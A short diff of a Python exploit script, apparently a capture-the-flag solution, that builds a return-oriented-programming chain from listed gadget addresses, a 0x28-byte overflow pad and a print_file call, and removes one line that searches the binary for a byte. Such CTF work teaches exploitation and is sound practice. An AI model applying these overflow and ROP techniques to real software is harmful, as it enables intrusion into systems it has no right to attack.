@@ -52,8 +52,6 @@ XLATB = p64(0x400628) # xlatb ; ret
 MOVEAX0_POPRBP = p64(0x400610) # mov eax, 0 ; pop rbp ; ret
 PRINT_FILE = p64(0x400510) # print_file
 
-F = next(exe.search(b"f"))
-
 attack = b"A"*0x28
 attack += POPRDI + p64(DATA) # set rdi to data
 attack += MOVEAX0_POPRBP + b"12345678" # junk data for rbp
